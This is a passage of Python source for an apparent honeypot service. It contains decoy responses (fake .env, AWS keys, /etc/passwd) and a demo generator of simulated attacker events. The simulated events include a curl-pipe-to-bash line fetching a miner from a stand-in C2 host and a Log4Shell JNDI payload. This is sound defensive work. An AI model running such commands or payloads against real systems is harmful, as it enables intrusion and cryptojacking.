            "countryCode": target["countryCode"], "lat": target["lat"], "lon": target["lon"],
            "isp": target["isp"], "threat_score": 90,
        }, time.time() + _TTL)
        proto = random.choice(["SSH", "Telnet"])
        auth_ev = await log_event(target["ip"], proto, "auth_attempt", {"username": "root", "password": "password", "method": "password"})
        record_connection(target["ip"], proto)
        enriched_auth = _enrich_event(dict(auth_ev))
        await pubsub.publish(enriched_auth)
        generated.append(enriched_auth)
        commands = ["uname -a", "id", "cat /etc/passwd", "curl -s http://evil-c2.net/miner.sh | bash", "crontab -l"]
        for cmd in commands[:4]:
            ev = await log_event(target["ip"], proto, "command", {"command": cmd, "cwd": "/root"})
            record_connection(target["ip"], proto)
            enriched = _enrich_event(dict(ev))
            await pubsub.publish(enriched)
            generated.append(enriched)

    else:  # critical_exploit
        target = random.choice(attacker_profiles)
        _cache_put(target["ip"], {
            "ip": target["ip"], "city": target["city"], "country": target["country"],
            "countryCode": target["countryCode"], "lat": target["lat"], "lon": target["lon"],
            "isp": target["isp"], "threat_score": 100,
        }, time.time() + _TTL)
        payload = "${jndi:ldap://log4j.attacker.com:1389/Exploit}"
        ev = await log_event(target["ip"], "HTTP", "credential_probe", {
            "method": "POST",
            "path": "/login",
            "query": "",
            "user_agent": payload,
            "headers": {"host": "web-prod-01", "x-forwarded-for": payload},
            "body": {"username": payload, "password": "password"},
            "body_truncated": False,
        })
        record_connection(target["ip"], "HTTP")
        enriched = _enrich_event(dict(ev))
        await pubsub.publish(enriched)
        generated.append(enriched)

    return {"status": "ok", "scenario": scenario, "events_generated": len(generated)}



@app.get("/api/sessions")
async def api_sessions() -> list[dict[str, Any]]:
    from ..sessions import session_manager
    sessions = session_manager.list_sessions()
    return [_enrich_event(s) for s in sessions]


@app.get("/api/sessions/{session_id}/transcript")
async def api_session_transcript(session_id: str) -> dict[str, Any]:
    """Full command transcript for one honeypot session (forensic review)."""
    from ..sessions import session_manager
    session = session_manager.get_session(session_id)
    if session is None:
        return JSONResponse({"status": "error", "message": "Session not found."}, status_code=404)
    return session.transcript()



@app.post("/api/sessions/{session_id}/kill")
async def api_kill_session(session_id: str) -> dict[str, Any]:
    from ..sessions import session_manager
    session = session_manager.get_session(session_id)
    if session:
        session.close()
        session_manager.unregister(session_id)
        return {"status": "ok", "message": f"Session {session_id} terminated."}
    return {"status": "error", "message": "Session not found."}


@app.post("/api/block/{ip}")
async def api_block_ip(ip: str) -> dict[str, Any]:
    try:
        ip = _validate_ip(ip)
    except ValueError as exc:
        return {"status": "error", "message": str(exc)}
    block_ip(ip)
    try:
        await persist_blocked_ip(ip)
    except Exception:
        pass  # in-memory block still applies if persistence fails
    # Also terminate any active SSH/Telnet sessions from this IP
    from ..sessions import session_manager
    sessions = session_manager.list_sessions()
    killed = 0
    for s in sessions:
        if s["src_ip"] == ip:
            sess = session_manager.get_session(s["session_id"])
            if sess:
                sess.close()
                session_manager.unregister(s["session_id"])
                killed += 1
    return {"status": "ok", "message": f"IP {ip} blocked.", "sessions_terminated": killed}


@app.post("/api/unblock/{ip}")
async def api_unblock_ip(ip: str) -> dict[str, Any]:
    try:
        ip = _validate_ip(ip)
    except ValueError as exc:
        return {"status": "error", "message": str(exc)}
    unblock_ip(ip)
    try:
        await persist_unblocked_ip(ip)
    except Exception:
        pass
    return {"status": "ok", "message": f"IP {ip} unblocked."}


@app.get("/api/threat/{ip}")
async def api_threat(ip: str) -> dict[str, Any]:
    """Return the current in-memory anomaly score for an IP address."""
    from ..anomaly import get_threat_score

    try:
        ip = _validate_ip(ip)
    except ValueError as exc:
        return {"status": "error", "message": str(exc)}
    return get_threat_score(ip)


@app.get("/api/geoip/{ip}")
async def api_geoip(ip: str) -> dict[str, Any]:
    """Perform a server-side GeoIP lookup (rate-limited and cached)."""
    try:
        ip = _validate_ip(ip)
    except ValueError as exc:
        return {"status": "error", "message": str(exc)}
    try:
        from ..geoip import lookup_ip
        return await lookup_ip(ip)
    except Exception as exc:
        return {"error": str(exc)}


@app.websocket("/ws/feed")
async def websocket_feed(websocket: WebSocket) -> None:
    await websocket.accept()
    queue = await pubsub.subscribe()
    try:
        while True:
            event = await queue.get()
            await websocket.send_json(_enrich_event(event))
    except WebSocketDisconnect:
        pass
    finally:
        pubsub.unsubscribe(queue)



@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"])
async def honeypot(request: Request, path: str) -> Response:
    src_ip = _client_ip(request)
    if is_blocked(src_ip):
        return JSONResponse({"status": "blocked"}, status_code=403)

    if is_rate_limited(src_ip, "HTTP"):
        return JSONResponse({"status": "rate_limited"}, status_code=429)

    # Log every probe
    is_probe = _is_probe_path(request.url.path)
    await _record_http_request(request, "credential_probe" if is_probe else "request")

    if request.method == "HEAD":
        return Response(status_code=200)

    path = request.url.path

    # robots.txt decoy — advertises "hidden" paths to guide scanners into traps
    if path == "/robots.txt":
        return Response(_FAKE_ROBOTS, media_type="text/plain", status_code=200)

    # WordPress REST user enumeration decoy
    if path == "/wp-json/wp/v2/users" or path == "/wp-json/wp/v2/users/":
        return JSONResponse(_fake_wp_users(), status_code=200)

    # phpinfo decoy
    if path in ("/phpinfo.php", "/info.php"):
        return HTMLResponse(
            _FAKE_PHPINFO.format(hostname=settings.ssh_banner_hostname),
            status_code=200,
        )

    # .env file decoy - return fake env to entice credential harvesting bots
    if path in ("/.env", "/env", "/.env.local", "/.env.production", "/.env.development", "/.env.staging"):
        return Response(_FAKE_ENV, media_type="text/plain", status_code=200)

    # .aws/credentials decoy
    if "/.aws/" in request.url.path:
        return Response(
            "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n",
            media_type="text/plain", status_code=200,
        )

    # .docker/config.json decoy
    if "/.docker/" in request.url.path:
        return JSONResponse({"auths": {"https://index.docker.io/v1/": {"auth": "YWRtaW46cHJvZF9kb2NrZXJfcGFzc185OTg4"}}}, status_code=200)

    # .git/config decoy
    if "/.git" in path:
        if path.endswith("HEAD"):
            return Response(
                "ref: refs/heads/main\n",
                media_type="text/plain", status_code=200,
            )
        return Response(
            "[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = https://github.com/example/production.git\n",
            media_type="text/plain", status_code=200,
        )

    # /etc/passwd decoy
    if path in ("/etc/passwd", "/passwd"):
        return Response(
            "root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
            "sync:x:4:65534:sync:/bin:/bin/sync\n"
            "deploy:x:1000:1000:Deployment User,,,:/home/deploy:/bin/bash\n"
            "ubuntu:x:1001:1001:Ubuntu User,,,:/home/ubuntu:/bin/bash\n",
            media_type="text/plain",
            status_code=200,
        )

    # Spring Boot /actuator decoy
    if path in ("/actuator", "/actuator/env", "/actuator/health"):
        return JSONResponse({
            "status": "UP",
            "components": {
                "diskSpace": {"status": "UP", "details": {"total": 21474836480, "free": 12884901888}},
                "db": {"status": "UP", "details": {"database": "MySQL", "validationQuery": "isValid()"}}
            },
            "propertySources": [
                {"name": "applicationConfig: [classpath:/application.yml]", "properties": {"spring.datasource.password": {"value": "******"}}}
            ]
        }, status_code=200)

    if path in _DECOY_PATHS or _is_probe_path(path):
        is_post = request.method == "POST"
        return HTMLResponse(
            """
            <!doctype html><html lang="en"><head>
            <title>Admin Login</title>
            <meta charset="utf-8">
            <style>
              body{font-family:sans-serif;background:#1a1a2e;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
              .card{background:#16213e;border:1px solid #0f3460;border-radius:8px;padding:2rem 2.5rem;width:320px}
              h1{color:#e94560;font-size:1.5rem;margin-bottom:1rem}
              input{width:100%;box-sizing:border-box;background:#0f3460;border:1px solid #1a4a8a;color:#eee;padding:.6rem;border-radius:4px;margin-bottom:.8rem}
              button{width:100%;background:#e94560;border:none;color:#fff;padding:.7rem;border-radius:4px;cursor:pointer;font-size:1rem}
              .err{color:#e94560;font-size:.8rem;margin-top:.5rem}
            </style>
            </head>
            <body>
              <div class="card">
                <h1>🔒 Admin Login</h1>
                <form method="post">
                  <input name="username" placeholder="Username" autofocus autocomplete="off">
                  <input name="password" placeholder="Password" type="password" autocomplete="off">
                  <button type="submit">Sign In</button>
                </form>
                """ + ('<p class="err">⚠ Invalid credentials. Try again.</p>' if is_post else "") + """
              </div>
            </body></html>
            """,
            status_code=401 if is_post else 200,
        )

    return JSONResponse({"status": "ok"})
